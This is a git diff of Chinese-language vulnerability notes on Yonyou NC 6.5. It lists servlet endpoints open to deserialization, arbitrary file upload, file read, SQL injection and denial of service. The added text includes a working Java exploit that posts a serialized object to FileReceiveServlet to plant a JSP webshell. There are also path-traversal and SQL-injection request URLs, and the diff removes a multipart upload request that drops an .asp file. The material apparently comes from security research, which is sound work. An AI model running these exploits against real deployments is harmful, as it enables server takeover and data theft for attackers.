@@ -1,10 +1,9 @@
-记录用友nc6.5源码分析结果，不添加代码说明仅作学习参考
 ## 反序列化
 
 http://127.0.0.1:8081/service/~uapim/nc.bs.pub.im.UserQueryServiceServlet
 http://127.0.0.1:8081/service/~uapim/nc.bs.pub.im.UserSynchronizationServlet
 http://127.0.0.1:8081/service/~uapim/nc.bs.pub.im.UserAuthenticationServlet
-http://127.0.0.1:8081/service/~baseapp/nc.document.pub.fileSystem.servlet.UploadServlet	需要分析 看有没其他漏洞
+http://127.0.0.1:8081/service/~baseapp/nc.document.pub.fileSystem.servlet.UploadServlet
 http://127.0.0.1:8081/service/~webbd/nc.uap.bs.im.servlet.OAUserQryServlet
 http://127.0.0.1:8081/service/~webbd/nc.uap.bs.im.servlet.OAUserAuthenticationServlet
 http://127.0.0.1:8081/service/~webbd/nc.uap.bs.im.servlet.OAContactsFuzzySearchServlet
@@ -13,28 +12,80 @@ http://127.0.0.1:8081/servlet/~ic/nc.bs.framework.mx.MxServlet
 http://127.0.0.1:8081/servlet/~ic/nc.bs.framework.mx.monitor.MonitorServlet
 http://127.0.0.1:8081/service/~aert/uap.pub.ae.model.handle.ModelHandleServlet
 http://127.0.0.1:8081/service/~cc/nc.bs.logging.config.LoggingConfigServlet
-http://127.0.0.1:8081/servlet/~baseapp/nc.document.pub.fileSystem.servlet.DownloadServlet  需要分析	看有没其他漏洞
-http://127.0.0.1:8081/servlet/~uapbs/uap.pub.dc.fileSystem.servlet.DownloadServlet			需要分析	看有没其他漏洞
+http://127.0.0.1:8081/servlet/~baseapp/nc.document.pub.fileSystem.servlet.DownloadServlet 
+http://127.0.0.1:8081/servlet/~uapbs/uap.pub.dc.fileSystem.servlet.DownloadServlet
 http://127.0.0.1:8081/servlet/~baseapp/nc.document.pub.fileSystem.servlet.DeleteServlet
 http://127.0.0.1:8081/servlet/~ic/uap.framework.rc.controller.ResourceManagerServlet
 
-FileUploadServlet.class    	需要分析	看有没其他漏洞
-
-FileReceiveServlet.class	需要分析	看有没其他漏洞
-
-FileParserServlet.class		需要分析	看有没其他漏洞
-
-FileManageServlet.class		需要分析	看有没其他漏洞
-
-
-
+```
+FileUploadServlet.class
+FileParserServlet.class
+FileManageServlet.class
 ContactsQueryServiceServlet.class  
-
 ContactsFuzzySearchServlet.class
-
-ConfigResourceServlet.class  逻辑漏洞-用户验证有缺陷
-
+ConfigResourceServlet.class 
 ActionHandlerServlet.class
+```
+
+FileReceiveServlet.class  文件上传poc如下：（万一cc链利用不了 上面其他反序列化都可以像这样构造来还原原始请求逻辑）
+
+```java
+public class Yongyou_upload {
+    public static void main(String[] args) throws Exception {
+        BufferedReader reader;
+        StringBuffer response;
+        String path="/servlet/FileReceiveServlet";
+        Map<String, Object> metaInfo = new HashMap<String, Object>();
+        metaInfo.put("TARGET_FILE_PATH", "webapps/nc_web");
+        metaInfo.put("FILE_NAME", "sectest666.jsp");
+        String uri=args[0];
+        URL url = new URL(uri+path);
+        HttpURLConnection httpUrlConn = (HttpURLConnection)url.openConnection();
+        httpUrlConn.setRequestProperty("Content-Type","application/x-java-serialized-object");
+        httpUrlConn.setDoOutput(true);
+        httpUrlConn.setDoInput(true);
+        httpUrlConn.setUseCaches(false);
+        httpUrlConn.setRequestMethod("POST");
+        httpUrlConn.connect();
+        ByteArrayOutputStream baos=new ByteArrayOutputStream();
+        OutputStream out = httpUrlConn.getOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(out);
+        oos.writeObject(metaInfo);
+        File file = new File(args[1]);
+        Long filelength = file.length();
+        byte[] filecontent = new byte[filelength.intValue()];
+        try {
+            FileInputStream in =new FileInputStream(file);
+            byte[] buf = new byte[1024];
+            int len = 0;
+            while ((len = in.read(buf)) != -1) {
+                baos.write(buf, 0, len);
+            }
+            baos.flush();
+            baos.writeTo(out);
+            baos.close();
+            InputStream inputStream = httpUrlConn.getInputStream();
+            reader = new BufferedReader(new InputStreamReader(inputStream, "UTF-8"));
+            String lines;
+            response = new StringBuffer("");
+
+            while ((lines = reader.readLine()) != null) {
+                response.append(lines);
+            }
+        } catch(IOException e) {
+            e.printStackTrace();
+        }
+        URL httpUrl = new URL(uri+"/test.jsp");
+        HttpURLConnection httpURLConnection = (HttpURLConnection) httpUrl.openConnection();
+        httpURLConnection.setReadTimeout(50000);
+        httpURLConnection.setRequestMethod("GET");
+        if(httpURLConnection.getResponseCode()==200){
+            System.out.println("shell 地址:\n"+uri+"/test.jsp");
+        }
+    }
+```
+
+
 
 ## 任意文件上传
 
@@ -98,26 +149,7 @@ SaveImageServlet.class       但是只能是.png文件	可利用windows特性%00
 	
 	漏洞利用的是windows特性%00， 如果windows版本过高不可能成功
 
-webrt/nc.uap.lfw.core.servlet.LfwFileUploadServlet   文件不知道为啥没传成功，估计要两个磁盘
-
-```
-POST /servlet/~webrt/nc.uap.lfw.core.servlet.LfwFileUploadServlet HTTP/1.1
-Host: 127.0.0.1:8081
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
-Content-Type: multipart/form-data; boundary=024ff46f71634a1c9bf8ec5820c26fa9
-Accept-Encoding: gzip, deflate
-Content-Length: 212
-
-
---024ff46f71634a1c9bf8ec5820c26fa9
-Content-Disposition: form-data; name="file"; filename="/../../../../../../../../../../../../../ZOScC.asp"
-
-2flYX0pZdqd9hXwFoszSIhjGiI9
---024ff46f71634a1c9bf8ec5820c26fa9--
-```
-
-
-
+ 
 ## 任意文件读取	
 
 OutputImageServlet.class  抽象代码， 将输入流作为文件内容返回给客户端
@@ -136,25 +168,20 @@ OutputImageServlet.class  抽象代码， 将输入流作为文件内容返回�
 http://127.0.0.1:8081/servlet/~maportal/;/com.yonyou.maportal.bs.padplugin.controller.DownloadServlet?filename=../../WEB-INF/web.xml
 
 FindWebResourceServlet.class  不能../ 
-	/NCFindWeb?service=IPreAlertConfigService&filename=
-	
+
+```
+/NCFindWeb?service=IPreAlertConfigService&filename=
+```
+
+​	
 
 ## sql注入
 
-MARosterPhotoServlet.class  已有
-
 ```
 http://127.0.0.1:8081/servlet/~pubapp/com.yonyou.ma.roster.servlet.MARosterPhotoServlet?photoId=123'&type=pid
+	
+	
 ```
-
-
-
-
-## 综合漏洞
-
-ManagerServlet.class  不是用友的 是tomcat的
-	
-	
 
 ## 拒绝服务
 
